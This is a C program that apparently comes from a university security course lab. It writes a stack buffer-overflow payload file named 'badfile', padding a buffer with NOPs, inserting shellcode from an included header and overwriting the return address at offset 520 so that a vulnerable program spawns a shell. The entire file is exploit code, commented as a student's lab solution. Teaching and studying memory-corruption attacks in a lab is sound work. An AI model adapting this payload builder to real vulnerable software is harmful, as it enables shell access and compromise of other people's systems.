
/* exploitBuffer.c   CSC348/648  10/6/2014                       */  
/* This program creates a file containing code to launch a shell */  
/*                                                               */  

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include"amdshellcode.h"  

/* you need to define an appropriate buffer size                 */
#define BUFFER_SIZE 528           //buffer size is 520 (distance between buffer and return
                                  //address in memory) plus 8 bytes for address

int main(int argc, char *argv[])  
{
	char buffer[BUFFER_SIZE]; //initialize character arry size 528
	FILE *badfile;            //define pointer to a file badfile
	long* ret;                //pointer to return address
	int i = 0;                //initialize i for loop, because c is for peasants

	/* Initialize buffer with 0x90 (NOP instruction)              */
	memset(&buffer, 0x90, BUFFER_SIZE); //clear memory to prevent errors

	/* You need to fill buffer with appropriate contents          */
	/* have fun...                                                */
	for(i = 0; i < strlen(amdshellcode); i++) {   //loop to copy characters from
		buffer[i] = amdshellcode[i];          //amdshellcode to buffer
	}
	ret = (long *)(buffer + 520);  //find location of return value in memory
	(*ret) = 0x7fffffffdfc0;       //set that return value to the rip from vulnerable.c


	/* Save the contents to the file "badfile"                    */
	badfile = fopen("./badfile", "w");       //open badfile with write permission
	fwrite(buffer, BUFFER_SIZE, 1, badfile); //write the contents of buffer to badfile
	fclose(badfile);                         //close badfile

	return 0;  
}  


